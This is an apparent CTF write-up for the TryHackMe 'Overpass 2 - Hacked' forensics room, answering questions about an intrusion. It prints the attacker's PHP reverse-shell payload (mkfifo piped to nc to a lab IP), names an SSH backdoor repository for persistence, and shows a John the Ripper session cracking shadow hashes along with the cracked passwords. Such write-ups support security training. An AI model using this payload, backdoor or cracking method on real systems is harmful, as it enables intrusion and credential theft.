# [Overpass 2 - Hacked](https://tryhackme.com/r/room/overpass2hacked)

### What was the URL of the page they used to upload a reverse shell?
Answer: /development/ 

Hint: there is just one url path in network logs

### What payload did the attacker use to gain access?
Answer: <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

Hint: download the upload.php and read the contents, you'll be able to see alot

### What password did the attacker use to privesc?
Answer: 

Hint: whenevernoteartinstant

### How did the attacker establish persistence?
Answer: https://github.com/NinjaJc01/ssh-backdoor

Hint: from that same file, you can read attacked cloned a git repo having establish ssh_backdoor

### Using the fasttrack wordlist, how many of the system passwords were crackable?
Answer: 4

Solution: As you can see from upload.php that attacker read the /etc/shadow file. Copy those hashes of the password
save them into a file like hashes.txt and use john the ripper to crack them.
Command : 

**john --wordlist=/usr/share/wordlists/fasttrack.txt password.txt 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secuirty3        (paradox)     
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
4g 0:00:00:01 DONE (2024-05-14 21:19) 2.962g/s 194.0p/s 857.7c/s 857.7C/s letmein..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed**
